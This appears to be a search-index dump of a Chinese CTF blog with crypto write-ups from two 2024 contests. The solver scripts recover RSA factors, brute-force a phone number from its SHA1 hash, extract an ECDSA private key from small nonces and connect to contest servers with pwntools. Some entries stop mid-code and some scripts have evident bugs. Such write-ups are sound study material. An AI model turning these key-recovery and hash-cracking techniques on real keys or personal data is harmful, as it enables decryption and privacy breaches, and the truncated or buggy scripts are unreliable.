print(f'┃ hints = {c1, c2}') print(f'┃ public key = {pubkey3}') print(f'┃ enc3 = {enc3}') part1 已知 $$pq=n,p+q=hints$$,直接利用sympy解方程就可以了 exp c= pq = n= e=65537 from Crypto.Util.number import * from sympy import* p, q = symbols('p q') eq1 = Eq(p+q, pq) eq2 = Eq(p*q, n) sol = solve((eq1, eq2), (p, q)) print(sol) p= q= phi=(p-1)*(q-1) d = inverse(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) part2 已知 $$h=ap+bq$$,而且有一百组，pq都是512bits，而ab是180bits，有这样小的数，我们就可以想到用格，因为自己太菜，直接找到了ductf2023年的exp，改成一百组，就直接出来了（好像四组就行） exp import itertools from Crypto.Util.number import long_to_bytes, GCD from sage.all import Matrix, ZZ, QQ, ideal hints = n = e = 65537 c = V = hints k = 2**400 M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V))) B = [b[1:] for b in M.LLL()] M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V))) B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == {0}] for combination in itertools.product(range(101), repeat=2): T = combination[0] * B[0] + combination[1] * B[1] a = T[:len(V)] kq = GCD(a[1] * hints[0] - a[0] * hints[1], n) if 1 \u003c kq \u003c n: print('find!', kq, combination[0], combination[1]) break for i in range(2**16, 1, -1): if kq % i == 0: kq //= i q = int(kq) p = int(n // kq) print(p, q) part3 写了一个小时，然后发现用的第二组密钥加密的，真的难崩 正确写法可以参考这个帖子 ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:2","tags":["crypto"],"title":"强网杯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"21step task import re import random from secrets import flag print(f'Can you weight a 128 bits number in 21 steps') pattern = r'([AB]|\\d+)=([AB]|\\d+)(\\+|\\-|\\*|//|\u003c\u003c|\u003e\u003e|\u0026|\\^|%)([AB]|\\d+)' command = input().strip() assert command[-1] == ';' assert all([re.fullmatch(pattern, i) for i in command[:-1].split(';')]) step = 21 for i in command[:-1].split(';'): t = i.translate(str.maketrans('', '', '=AB0123456789')) if t in ['\u003e\u003e', '\u003c\u003c', '+', '-', '\u0026', '^']: step -= 1 elif t in ['*', '/', '%']: step -= 3 if step \u003c 0:exit() success = 0 w = lambda x: sum([int(i) for i in list(bin(x)[2:])]) for _ in range(100): A = random.randrange(0, 2**128) wa = w(A) B = 0 try : exec(\"global A; global B;\" + command) except : exit() if A == wa: success += 1 if success == 100: print(flag) 思路：很直接的题目，一个128bits的数，在21步算出他二进制中一的数量，直接找到Integer的类型源码，改成128位就好了 exp from pwn import * io = remote('39.107.90.219', 22677) command = 'B=A\u003e\u003e1;B=B\u0026113427455640312821154458202477256070485;A=A-B;B=A\u003e\u003e2;B=B\u002668056473384187692692674921486353642291;A=A\u002668056473384187692692674921486353642291;A=A+B;B=A\u003e\u003e4;A=A+B;A=A\u002620016609818878733144904388672456953615;B=A\u003e\u003e8;A=A+B;B=A\u003e\u003e16;A=A+B;B=A\u003e\u003e32;A=A+B;B=A\u003e\u003e64;A=A+B;A=A\u0026127;' io.recvuntil(b'Can you weight a 128 bits number in 21 steps') for i in range(100): io.sendline(command) io.recvline() io.interactive() ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:3","tags":["crypto"],"title":"强网杯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"总结 没有爆零！！！其他的慢慢复现更新 ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:3:0","tags":["crypto"],"title":"强网杯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"前言 报名了，但是没打，刚回家，就被亲戚拉过去串门了，然后中间还有一天西湖论剑，害 ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:1:0","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"题目 ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:0","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"通往哈希的旅程 题目内容： 在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串\"ca12fd8250972ec363a16593356abb1f3cf3a16d\"，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}） 即已知前三位，爆破八位，好像cmd5已经有了 import hashlib def crack_hash(target_hash): prefix = \"188\" for num in range(100000000): phone_number = prefix + f\"{num:08d}\" generated_hash = hashlib.sha1(phone_number.encode()).hexdigest() if generated_hash == target_hash: return phone_number return None target_hash = \"ca12fd8250972ec363a16593356abb1f3cf3a16d\" result = crack_hash(target_hash) if result: print(f\"破解成功！电话号码为：flag{{{result}}}\") else: print(\"破解失败，未找到匹配的号码。\") ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:1","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"你是小哈斯? 题目内容： 年轻黑客小符参加CTF大赛，他发现这个小哈斯文件的内容存在高度规律性，并且文件名中有隐藏信息，他成功找到了隐藏的信息，并破解了挑战。得意地说：“成功在于探索与质疑，碰撞是发现真相的关键！” 一个一个映射过去，sha256，sha1，md5都试一下，发现是sha1，结果好像可以从160bits看出来这是sha1 import hashlib import string def attack(h): table = string.ascii_letters + string.digits + \"!@#$%^\u0026*()_+-=[]{}|;:,.\u003c\u003e?/~`\" for m in table: if hashlib.sha1(m.encode()).hexdigest() == h: return m return None data = open('chall.txt', 'r').readlines() hashes = [] for i in data: hashes.append(i.strip()) table = {} for i in hashes: table[i] = attack(i) m = \"\" for i in hashes: if table[i] is not None: m += table[i] print(m) ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:2","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"RSA1 task from Crypto.Util.number import * import uuid p, q = [getPrime(512) for _ in range(2)] N = p * q flag = b'flag{' + str(uuid.uuid4()).encode() + b'}' flag += bin(getPrime((1024 - bytes_to_long(flag).bit_length()) // 8)).encode() m1 = bytes_to_long(flag) m2 = bytes_to_long(''.join(chr((ord(i) + 3) % 128) for i in flag.decode()).encode()) e = getPrime(128) c1 = pow(m1 * e, 2835, N) c2 = pow(m2, 2025, N) c3 = pow(m2, 2835, N) + e print(f'{N = }') print(f'{c1 = }') print(f'{c2 = }') print(f'{c3 = }') ''' N = 176871561120476589165761750300633332586877708342448994506175624203633860119621512318321172927876389631918300184221082317741380365447197777026256405312212716630617721606918066048995683899616059388173629437673018386590043053146712870572300799479269947118251011967950970286626852935438101046112260915112568392601 c1 = 47280375006817082521114885578132104427687384457963920263778661542552259860890075321953563867658233347930121507835612417278438979006705016537596357679038471176957659834155694284364682759675841808209812316094965393550509913984888849945421092463842546631228640293794745005338773574343676100121000764021207044019 c2 = 176231410933979134585886078013933649498379873444851943224935010972452769899603364686158279269197891190643725008151812150428808550310587709008683339436590112802756767140102136304346001599401670291938369014436170693864034099138767167055456635760196888578642643971920733784690410395944410255241615897032471127315 c3 = 135594807884016971356816423169128168727346102408490289623885211179619571354105102393658249292333179346497415129785184654008299725617668655640857318063992703265407162085178885733134590524577996093366819328960462500124201402816244104477018279673183368074374836717994805448310223434099196774685324616523478136309 ''' 首先e是可以利用c2,c3多项式直接求出来的，后面部分有点类似日本的那个rot13了，但是更简单，差值不用自己手算，直接生成m1和m2减一下就好了，然后就是hgcd的富兰克林 N = 176871561120476589165761750300633332586877708342448994506175624203633860119621512318321172927876389631918300184221082317741380365447197777026256405312212716630617721606918066048995683899616059388173629437673018386590043053146712870572300799479269947118251011967950970286626852935438101046112260915112568392601 c1 = 47280375006817082521114885578132104427687384457963920263778661542552259860890075321953563867658233347930121507835612417278438979006705016537596357679038471176957659834155694284364682759675841808209812316094965393550509913984888849945421092463842546631228640293794745005338773574343676100121000764021207044019 c2 = 176231410933979134585886078013933649498379873444851943224935010972452769899603364686158279269197891190643725008151812150428808550310587709008683339436590112802756767140102136304346001599401670291938369014436170693864034099138767167055456635760196888578642643971920733784690410395944410255241615897032471127315 c3 = 135594807884016971356816423169128168727346102408490289623885211179619571354105102393658249292333179346497415129785184654008299725617668655640857318063992703265407162085178885733134590524577996093366819328960462500124201402816244104477018279673183368074374836717994805448310223434099196774685324616523478136309 from Crypto.Util.number import * import sys '''PR.\u003cx\u003e = PolynomialRing(Zmod(N)) f=(c3-x)^5-(c2)^7 res=f.monic().small_roots(X=2^128,beta=0.4,epsilon=0.02) print(res) ''' '''from Crypto.Util.number import * import uuid flag = b'flag{' + str(uuid.uuid4()).encode() + b'}' flag += bin(getPrime((1024 - bytes_to_long(flag).bit_length()) // 8)).encode() m1 = bytes_to_long(flag) m2 = bytes_to_long(''.join(chr((ord(i) + 3) % 128) for i in flag.decode()).encode()) print(m2-m1)''' e=281211879955223558268422413173406510291 b=138604255630984394504644405862999441108691457990544710059664868220625513430462483763119797291779992529360824019886958759717736876661453044335745573603330761817432828924688993026332102549607397901351619425324993583087500714061523945925857368498922102768458574857510324727265052999967460998294909713988129273348867 def HGCD(a, b): if 2 * b.degree() \u003c= a.degree(","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:3","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"factor task import random import os from Crypto.Util.number import * from secret import flag def pad(x, n): while len(x) \u003c n // 8: x += os.urandom(1) return x def genp(p, l): while 1: r = random.randint(1 \u003c\u003c l - 1, 1 \u003c\u003c l) if isPrime(p + r): return p + r bits = 1024 b = 345 flag = pad(flag, bits * 3) m = bytes_to_long(flag) p = getPrime(bits) q = genp(p, b) r = genp(q, b) n = p * q * r print(n) print(pow(m, 65537, n)) # 5605777780127871552103278440489930168557569118966981388111283042550796167470265465148458919374665519335013101681890408413810351780671950283765145543168779446153786190869731166707967097095246677053262868926963631796027692694223765625053269102325714361312299011876036815423751522482629914361369303649193526946050137701205931577449326939722902280884984494828850611521784382097900268639648421100760612558110614208245291400961758972415881709281708443424129033685255718996719201537066717587527029554871540574867831957154286334639399985379381455084604901293000229526196544921067214723085504463673412082637877637982771445298815007769526806112008703908400170846707986989384244531990469279604588770393462375930699135443458952703826608237292999895910024613311408883134789788541751697007502656798556053417265191533053158952284994030769145926816478390761642058013769635850833893158830591398862163134753203291719549474871116653745337968227 # 2998195560453407057321637509862236387961676411996988529185696118404592349869917006166370346762261303282478779647282039317061146533808487789458703169149689179547543732935053220010550004328207373171271534689897340156346458951776319267981966893926724550629182100766890856964207263709029611781806548130358294543573874132473259788387939849997550651614987993962540192023207354839106090274252125961835070701748643163379053118598595995782448140944376681636633592442158453965800439960134688017496184195454406927204485213436540382637720118180670197194949275760000729877093621741313147190401896114633643891311672542703928421032698499968701052818985292683628072129271790220674145955527935027879112279336148316425115255710066132502392447843608711463775710558880259205308541126041959858947252063815158749021817255637836170676726466347847422352280599210078359786387419424076245960344657767332883964636288493649066530215094453490169688507988 三元copper，pqr接近，直接把n开三次根号 import itertools from Crypto.Util.number import * import gmpy2 from tqdm import trange def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() #取得模数 f /= f.coefficients().pop(0) #最高次项系数化为0，coefficients是多项式的降次幂排列系数 f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i #收集基多项式 for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) print(G) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] n=560577778012787155210327844048993016855756911896698138811128304255079616747026546514845891937466551933501310168189040841381035178067195028376514554316877944615378619086973116670796709709524667705326286892696363179602769269422376562505326910232571436131229901187603681542375152248262991436136930364919352694605013770120593157744932693972290228088498449482885061152178438209790026863964842110076061255811061420824529140096175897241588170928170844342412903368525571899671920153706671758752702955487154057486783195715428633463939998537938145508460490129300022952619654492106721472308550","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:4","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"funny_rsa task import random import libnum from Crypto.Util.number import bytes_to_long, long_to_bytes print(\"Welcome to ChunqiuCTF Game!\") print(\"接下来完成下面的挑战\") print(\"Good luck!\") # funny hint = b' ' m = b' ' p = libnum.generate_prime(1024) q = libnum.generate_prime(1024) n = p * q print(\"give you some funny numbers\") # funny 1 print(p+q - p*q + random.randint(-1025, +1025)) # funny 2 print(bytes_to_long(m)*bytes_to_long(hint)) # funny 3 print(bytes_to_long(m)*n*bytes_to_long(hint) - 1025) # funny 4 print(pow(bytes_to_long(hint), 65537, n)) a=-17696257697673533517695215344482784803953262308315416688683426036407670627060768442028628137969719289734388098357659521255966031131390425549974547376165392147394271974280020234101031837837842620775164967619688351222631803585213762205793801828461058523503457022704948803795360591719481537859524689187847958423587638744086265395438163720708785636319741908901866136858161996560525252461619641697255819255661269266471689541673348377717503957328827459396677344554172542244540931545166846117626585580964318010181586516365891413041095399344533013057011854734701706641516027767197631044458866554524544179750101814734153116374 b=23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011 c=419166458284161364374927086939132546372091965414091344286510440034452974193054721041229068769658972346759176374539266235862042787888391905466876330331208651698002159575012622762558316612596034044109738533275009086940744966244759977014078484433213617582101347769476703012517531619023366639507114909172774156647998737369356116119513795863130218094614475699956104117183821832339358478426978211282822163928764161915824622224165694904342224081321345691796882691318330781141960650263488927837990954860719950761728580780956673732592771855694502630374907978111094148614378212006604233062606116168868545120407836000858982789824582335703891535021579560434875457656655941164757860852341484554015214879991896412137447010444797452119431147303295803678311972500421396900616845556636124424993090559354406417222700637726789045926994792374756038517484548544506630672251868349748176389591615802039026216656891403871728516658502023897343287181822303758976641229952646993446276281728919020747050486979968215989594984778920359425264076558022228448529089047021814759587052098774273578311709416672952218680244714492318709603579024 d=13541898381047120826573743874105965191304100799517820464813250201030319771155430755606644860103469823030581858410957600027665504533335597988508084284252510961847999525811558651340906333101248760970154440885012717108131962658921396549020943832983712611749095468180648011521808106480590665594160479324931351996812185581193608244652792936715504284312172734662364676167010674359243219959129435127950232321130725013160026977752389409620674167037650367196748592335698164875097139931376389630867192761783936757260359606379088577977154378217235326249540098268616890307702288393952949444753648206049856544634755301197410481479 神人题目，求出后是fakeflag，把里面的数拉出来再转一下 b=23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011 c=419166458284161364374927086939132546372091965414091344286510440034452974193054721","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:5","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"EZ_rsa task from secret import flag from Crypto.Util.number import * import hashlib p = getPrime(512) q = getPrime(512) N = p * q e = getPrime(1023) assert e \u003c N c = pow(bytes_to_long(flag), e, N) print(f'{N = }') print(f'{e = }') print(f'{c = }') phi = (p - 1) * (q - 1) d = inverse(e, phi) k = (e * d - 1) // phi dh = d \u003e\u003e 234 dl = d % pow(2, 24) kh = k \u003e\u003e 999 hash224 = bytes_to_long(hashlib.sha224(long_to_bytes(dl)).digest()) hash512 = bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest()) leak = hash224 ^ hash512 ^ (k % pow(2, 512)) print(f'{dh = }') print(f'{leak = }') ''' N = 136118062754183389745310564810647775266982676548047737735816992637554134173584848603639466464742356367710495866667096829923708012429655117288119142397966759435369796296519879851106832954992705045187415658986211525671137762731976849094686834222367125196467449367851805003704233320272315754132109804930069754909 e = 84535510470616870286532166161640751551050308780129888352717168230068335698416787047431513418926383858925725335047735841034775106751946839596675772454042961048327194226031173378872580065568452305222770543163564100989527239870852223343451888139802496983605150231009547594049003160603704776585654802288319835839 c = 33745401996968966125635182001303085430914839302716417610841429593849273978442350942630172006035442091942958947937532529202276212995044284510510725187795271653040111323072540459883317296470560328421002809817807686065821857470217309420073434521024668676234556811305412689715656908592843647993803972375716032906 dh = 4640688526301435859021440727129799022671839221457908177477494774081091121794107526784960489513468813917071906410636566370999080603260865728323300663211132743906763686754869052054190200779414682351769446970834390388398743976589588812203933 leak = 12097621642342138576471965047192766550499613568690540866008318074007729495429051811080620384167050353010748708981244471992693663360941733033307618896919023 ''' 和su的类似，先拿到k高位，然后通过d去求出完整的k，p+q=N+1-K**(-1) mod e,e是1023bits，就是完整的p+q了 from Crypto.Util.number import* import hashlib from tqdm import trange n = 136118062754183389745310564810647775266982676548047737735816992637554134173584848603639466464742356367710495866667096829923708012429655117288119142397966759435369796296519879851106832954992705045187415658986211525671137762731976849094686834222367125196467449367851805003704233320272315754132109804930069754909 e = 84535510470616870286532166161640751551050308780129888352717168230068335698416787047431513418926383858925725335047735841034775106751946839596675772454042961048327194226031173378872580065568452305222770543163564100989527239870852223343451888139802496983605150231009547594049003160603704776585654802288319835839 c = 33745401996968966125635182001303085430914839302716417610841429593849273978442350942630172006035442091942958947937532529202276212995044284510510725187795271653040111323072540459883317296470560328421002809817807686065821857470217309420073434521024668676234556811305412689715656908592843647993803972375716032906 dh = 4640688526301435859021440727129799022671839221457908177477494774081091121794107526784960489513468813917071906410636566370999080603260865728323300663211132743906763686754869052054190200779414682351769446970834390388398743976589588812203933 leak = 12097621642342138576471965047192766550499613568690540866008318074007729495429051811080620384167050353010748708981244471992693663360941733033307618896919023 dh=dh\u003c\u003c234 k_=(e*dh-1)//n kh=k_\u003e\u003e999 khh=k_\u003e\u003e512 khh+=1 khh=khh\u003c\u003c512 hash512=bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest()) def findpq(range): low=range[0] high=range[1] for dl in trange(low,high): hash224=bytes_to_long(hashlib.sha224(long_to_bytes(dl)).digest()) kl=leak^^hash224^^hash512 k=khh+kl kinv=inverse(k,e) s=(n+1+kinv)%e if 511\u003c=int(s).bit_length()\u003c=515: var('p,q') eq1=p+q==s eq2=p*q==n res=solve([eq1,eq2],[p,q]) print(res) break ranges=[(i,i+524288) for i in range(0,2^24,524288)] from multiprocessing import Pool with Pool(32) as pool: r=list(pool.i","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:6","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"running task from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from secret import flag K=5 p=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41] while i:=i+1: if all([0,i][sum([0,j][i%j==0]for j in range(1,i+1))\u003e2*i]%j for j in p[:K]):print(AES.new(key=md5(str(i).encode()).digest(),mode=AES.MODE_ECB).encrypt(pad(flag,16)));break # b'y.\\x86k\\xbd\\xbfd7)\\xcdHm\\xf7\\x1e\\xfdX\\xf6z\\xb0\\xd5XD}\\xe8m\\x81D\\x84\\x1c\\xa0\u003c\\x1f\\xd0f\\x9f\\xcc\\x89\\r\\xc4\\x9d\\xadbY\\xa3\\xb1\\x1d5?' Abundant Numbers的丰度5，直接看论文，把里面的数据一个一个试 https://projecteuclid.org/journals/bulletin-of-the-belgian-mathematical-society-simon-stevin/volume-12/issue-1/On-the-smallest-abundant-number-not-divisible-by-the-first/10.36045/bbms/1113318127.full?tab=ArticleFirstPage c=b'y.\\x86k\\xbd\\xbfd7)\\xcdHm\\xf7\\x1e\\xfdX\\xf6z\\xb0\\xd5XD}\\xe8m\\x81D\\x84\\x1c\\xa0\u003c\\x1f\\xd0f\\x9f\\xcc\\x89\\r\\xc4\\x9d\\xadbY\\xa3\\xb1\\x1d5?' from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from Crypto.Util.number import * primes=[] for i in range(350): if isPrime(i): primes.append(i) k=17**2*19**2*23**2 for i in primes[9:]: k*=i flag=AES.new(key=md5(str(k).encode()).digest(),mode=AES.MODE_ECB).decrypt(c) print(flag) ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:7","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"signtime task from hashlib import sha1 from Crypto.Util.number import bytes_to_long from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192 from datetime import datetime from random import randrange banner = \"\"\" // / / // ) ) // ) ) // ) ) // | | //____ // // / / (( //__| | / ____ // // / / \\\\ / ___ | // // // / / ) ) // | | //____/ / ((____/ / //____/ / ((___ / / // | | Welcome to this CTF challenge! you have THREE choices: - sign_time to get a signature - verify to verify the signature - I kown the secret to get the flag You only have TWO chances per connection. Best wish for you! \"\"\" generator = generator_192 order = generator.order() hint_message = '' flag_content = '' private_key_value = randrange(1, order - 1) public_key = Public_key(generator, generator * private_key_value) private_key = Private_key(public_key, private_key_value) def sign_current_time(): current_time = datetime.now() current_month = int(current_time.strftime(\"%m\")) current_seconds = int(current_time.strftime(\"%S\")) formatted_time = f\"{current_month}:{current_seconds}\" message = f\"The time is {formatted_time}\" message_hash = sha1(message.encode()).digest() signature = private_key.sign(bytes_to_long(message_hash), randrange(100, 100 + current_seconds)) return {\"time\": message, \"r\": hex(signature.r), \"s\": hex(signature.s)} def verify_signature(): user_message = input(\"Enter the message: \") user_r = input(\"Enter r in hexadecimal form: \") user_s = input(\"Enter s in hexadecimal form: \") message_hash = sha1(user_message.encode()).digest() signature_r = int(user_r, 16) signature_s = int(user_s, 16) signature = Signature(signature_r, signature_s) return public_key.verifies(bytes_to_long(message_hash), signature) def start_challenge(): print(banner) for _ in range(2): user_choice = input(\"Enter your option: \") if user_choice == 'sign_time': print(sign_current_time()) elif user_choice == 'verify': if verify_signature(): print(f\"The hint is: {hint_message}\") exit(0) else: print(\"Signature verification failed.\") elif user_choice == 'I kown the secret': if input(\"Enter the secret: \") == hex(private_key_value): print(f\"The flag is: {flag_content}\") exit(0) else: print(\"Invalid option!\") if __name__ == \"__main__\": start_challenge() ECDSA签名算法，通过时间戳来签名，然后通过验证签名来获取flag signature = private_key.sign(bytes_to_long(message_hash), randrange(100, 100 + current_seconds)) 传入的是hash和k，k很小，直接爆破 from hashlib import sha1 from Crypto.Util.number import * from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192 from pwn import * r=remote('',) r.recvuntil(b\"Enter your option: \") r.sendline(b\"sign_time\") a=eval(r.recvline().split().decode()) message=a['time'] r=eval(a['r']) s=eval(a['s']) generator = generator_192 order = generator.order() message_hash=bytes_to_long(sha1(message.encode()).digest()) sign=Signature(r,s) for k in range(100,160): d=(k*s-message_hash)*inverse(r,order)%order public_key=Public_key(generator,generator*d) private_key=Private_key(public_key,d) if private_key.verify(message_hash,sign): print(k) print(d) m=hex(d) r.sendline(b\"I kown the secret\") r.sendlineafter(b\"Enter the secret: \",m.encode()) r.interactive() break ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:8","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"dance task from Crypto.Util.number import * from secret import flag m = [int(i) for i in bin(bytes_to_long(flag))[2:].zfill(len(flag) * 8)] p = 0x1A0111EA397FE69A4B1BA7B6434BACD764774B84F38512BF6730D2A0F6B0F6241EABFFFEB153FFFFB9FEFFFFFFFFAAAB E = EllipticCurve(GF(p), [0, 4]) G1, G2 = E.gens() o1, o2 = G1.order(), G2.order() r = [randint(1, o1 - 1) for _ in range(len(m) + 1)] c = [] for i in range(len(m)): A = r[i] * G1 + m[i] * G2 B = m[i] * G1 + r[i + 1] * G2 c.extend(A + B) open(\"out.txt\", \"w\").write(f\"c = {c}\") su也是这种类型的题目，双线性配对，G1和G2已知，flag头前几个bits也知道， from Crypto.Util.number import * p = 0x1A0111EA397FE69A4B1BA7B6434BACD764774B84F38512BF6730D2A0F6B0F6241EABFFFEB153FFFFB9FEFFFFFFFFAAAB K=GF(p) E = EllipticCurve(K, [0, 4]) o=793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289 G1, G2 = E.gens() out=eval(open('out.txt','r').read().split('=')[-1]) cs=[] for i in range(0,len(out),3): c=(out[i],out[i+1],out[i+2]) cs.append(E(c)) T=G1.weil_pairing(G2,o) m='0' for i in range(1,len(cs)): now=m[i-1] ci=cs[i-1] cii=cs[i] Ti=G1.weil_pairing(ci,o) Tii=G2.weil_pairing(cii,o) tmp=Ti*Tii % p if tmp==1: m+=now else: m+=str(1-int(now)) flag=long_to_bytes(int(m,2)) print(flag) ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:9","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"right_data task from Crypto.Util.number import * from secret import flag from random import shuffle modulus = 257 key = list(flag) with open(\"output.txt\", \"w\") as f: for k in range(0, len(key)): key1 = getRandomRange(1, modulus) key2 = (key[k] + key1) % modulus coefs = [] for _ in range((modulus - 1) ** 2 - 1): c1, c2, c3 = ( getRandomRange(1, modulus), getRandomRange(1, modulus), getRandomRange(1, modulus), ) coefs.append(c1, c2, (c1 * key1 + c2 * key2 + c3) % modulus) shuffle(coefs) for i in coefs: s = str(i[0]) + \" \" + str(i[1]) + \" \" + str(i[2]) f.write(s + \"\\n\") key都是小值，可以爆破 from Crypto.Util.number import * from tqdm import * def findxyy(x,y): for i in range(65535): if ((x*C1[i]+y*C2[i])%257 == Value[i] ): return False return True def findm(): for x in range(1,257): for y in range(1,257): if findxyy(x,y): m=(y-x)%257 return chr(m) f=open('output.txt','r') flag=\"\" for _ in range(42): C1=[] C2=[] Value=[] for i in range(65535): tmp=f.readline().split(' ') c1=int(tmp[0]) c2=int(tmp[1]) value=int(tmp[2]) C1.append(c1) C2.append(c2) Value.append(value) flag+=findm() print(flag) 